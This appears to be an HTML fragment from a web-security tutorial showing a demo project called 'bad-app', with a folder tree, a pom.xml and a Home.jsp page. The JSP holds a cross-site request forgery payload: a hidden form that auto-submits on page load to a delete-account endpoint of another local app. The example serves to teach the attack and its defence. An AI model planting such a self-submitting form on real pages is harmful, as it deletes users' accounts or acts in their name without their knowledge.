@@ -1,0 +1,47 @@
+<div data-project="15" data-project-name="bad-app" class="u-mb-4">
+    <ul data-project-folders>
+        <li data-opened>
+            src
+            <ul>
+                <li data-opened>
+                    main
+                    <ul>
+                        <li data-java-packages-folder>java</li>
+                        <li>resources</li>
+                        <li data-opened>webapp</li>
+                    </ul>
+                </li>
+                <li>
+                    test
+                    <ul>
+                        <li>java</li>
+                        <li>resources</li>
+                    </ul>
+                </li>
+            </ul>
+        </li>
+        <li>target</li>
+    </ul>
+<pre data-code="pom.xml"><code class="language-xml">&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+    &lt;groupId&gt;com.example&lt;/groupId&gt;
+    &lt;artifactId&gt;bad-app&lt;/artifactId&gt;
+    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
+    &lt;packaging&gt;war&lt;/packaging&gt;
+    &lt;name&gt;bad-app&lt;/name&gt;
+&lt;/project&gt;</code></pre>
+<pre data-code="Home.jsp" data-folder="src/main/webapp" data-active><code class="language-html">&lt;%@page contentType="text/html" pageEncoding="UTF-8"%&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;Bad app&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form id="form" method="POST" action="http://localhost:8080/example-app/delete-account"&gt;&lt;/form&gt;
+    &lt;script&gt;
+        document.getElementById("form").submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</div>
